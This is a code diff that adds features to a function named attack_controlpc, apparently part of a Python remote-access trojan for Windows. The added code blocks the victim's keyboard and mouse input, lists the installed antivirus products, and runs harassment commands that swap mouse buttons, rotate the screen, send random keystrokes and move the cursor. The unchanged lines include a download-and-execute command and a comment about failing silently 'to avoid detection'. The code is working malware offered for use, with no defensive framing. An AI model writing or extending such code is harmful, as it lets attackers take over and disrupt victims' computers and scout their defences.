@@ -247,11 +247,12 @@ def attack_controlpc(target, duration=60):
             os.system("shutdown /l /f")
             
         elif command == "popup":
-            # Display a popup message
+            # Display a popup message (always on top)
             if len(parts) > 1:
                 message = parts[1]
                 import ctypes
-                ctypes.windll.user32.MessageBoxW(0, message, "System Message", 0)
+                # Create always on top window
+                ctypes.windll.user32.MessageBoxW(0, message, "System Message", 0x00001000)  # MB_TOPMOST flag
                 
         elif command == "download_execute":
             # Download and execute a file
@@ -285,6 +286,153 @@ def attack_controlpc(target, duration=60):
                 
                 # Execute the file
                 os.startfile(file_path)
+                
+        elif command == "freeze_keyboard":
+            # Freeze keyboard input
+            import ctypes
+            # Block keyboard input
+            ctypes.windll.user32.BlockInput(True)
+            
+        elif command == "freeze_mouse":
+            # Freeze mouse input
+            import ctypes
+            # This is a bit more complex - we'll use a hook to block mouse events
+            # For now, we'll just block all input which includes mouse
+            ctypes.windll.user32.BlockInput(True)
+            
+        elif command == "freeze_both":
+            # Freeze both keyboard and mouse
+            import ctypes
+            ctypes.windll.user32.BlockInput(True)
+            
+        elif command == "unfreeze":
+            # Unfreeze input
+            import ctypes
+            ctypes.windll.user32.BlockInput(False)
+            
+        elif command == "check_av":
+            # Check installed antivirus
+            import os
+            import winreg
+            
+            # Common AV registry paths
+            av_paths = [
+                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
+                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
+            ]
+            
+            av_list = []
+            for path in av_paths:
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
+                    for i in range(0, winreg.QueryInfoKey(key)[0]):
+                        try:
+                            subkey_name = winreg.EnumKey(key, i)
+                            subkey = winreg.OpenKey(key, subkey_name)
+                            display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
+                            if any(term in display_name.lower() for term in ['antivirus', 'av', 'security', 'endpoint', 'defender', 'mcafee', 'norton', 'kaspersky', 'bitdefender', 'avast', 'avg', 'eset', 'trend micro']):
+                                av_list.append(display_name)
+                        except:
+                            pass
+                except:
+                    pass
+            
+            # Show results in a popup
+            if av_list:
+                av_text = "\n".join(av_list)
+                import ctypes
+                ctypes.windll.user32.MessageBoxW(0, f"Installed AV:\n{av_text}", "AV Check", 0)
+            else:
+                import ctypes
+                ctypes.windll.user32.MessageBoxW(0, "No known antivirus detected", "AV Check", 0)
+                
+        elif command == "troll":
+            # Troll features
+            if len(parts) > 1:
+                troll_cmd = parts[1]
+                
+                if troll_cmd == "open_cd":
+                    # Open CD drive
+                    import ctypes
+                    ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
+                    
+                elif troll_cmd == "swap_mouse":
+                    # Swap mouse buttons
+                    import ctypes
+                    # Get current setting
+                    current = ctypes.windll.user32.GetSystemMetrics(23)  # SM_SWAPBUTTON
+                    # Swap it
+                    ctypes.windll.user32.SwapMouseButton(not current)
+                    
+                elif troll_cmd == "rotate_screen":
+                    # Rotate screen 180 degrees
+                    import ctypes
+                    device = ctypes.windll.user32.EnumDisplayDevicesW(None, 0, 0)
+                    ctypes.windll.user32.ChangeDisplaySettingsExW(device.DeviceName, None, None, 0x00000004 | 0x00000002, None)  # DMDO_180
+                    
+                elif troll_cmd == "invert_colors":
+                    # Invert colors (high contrast theme)
+                    import ctypes
+                    # Toggle high contrast mode
+                    SPI_SETHIGHCONTRAST = 0x0043
+                    HCF_HIGHCONTRASTON = 0x00000001
+                    class HIGHCONTRAST(ctypes.Structure):
+                        _fields_ = [('cbSize', ctypes.c_uint),
+                                   ('dwFlags', ctypes.c_uint),
+                                   ('lpszDefaultScheme', ctypes.c_wchar_p)]
+                    hc = HIGHCONTRAST()
+                    hc.cbSize = ctypes.sizeof(HIGHCONTRAST)
+                    hc.dwFlags = HCF_HIGHCONTRASTON
+                    hc.lpszDefaultScheme = None
+                    ctypes.windll.user32.SystemParametersInfoW(SPI_SETHIGHCONTRAST, ctypes.sizeof(hc), ctypes.byref(hc), 0)
+                    
+                elif troll_cmd == "mouse_jiggler":
+                    # Make mouse move randomly
+                    import ctypes
+                    import threading
+                    import time
+                    
+                    def jiggle_mouse():
+                        while True:
+                            x = random.randint(0, 100)
+                            y = random.randint(0, 100)
+                            ctypes.windll.user32.SetCursorPos(x, y)
+                            time.sleep(5)
+                    
+                    # Start in a thread
+                    thread = threading.Thread(target=jiggle_mouse)
+                    thread.daemon = True
+                    thread.start()
+                    
+                elif troll_cmd == "keyboard_spam":
+                    # Type random characters
+                    import ctypes
+                    import threading
+                    import time
+                    
+                    def spam_keys():
+                        while True:
+                            # Random key press
+                            key = random.randint(65, 90)  # A-Z
+                            ctypes.windll.user32.keybd_event(key, 0, 0, 0)
+                            ctypes.windll.user32.keybd_event(key, 0, 2, 0)
+                            time.sleep(1)
+                    
+                    # Start in a thread
+                    thread = threading.Thread(target=spam_keys)
+                    thread.daemon = True
+                    thread.start()
+                    
+                elif troll_cmd == "play_sound":
+                    # Play a system sound
+                    import winsound
+                    winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS)
+                    
+                elif troll_cmd == "change_wallpaper":
+                    # Change desktop wallpaper
+                    import ctypes
+                    # Use a solid color
+                    ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)
                 
     except Exception as e:
         # Silently fail to avoid detection
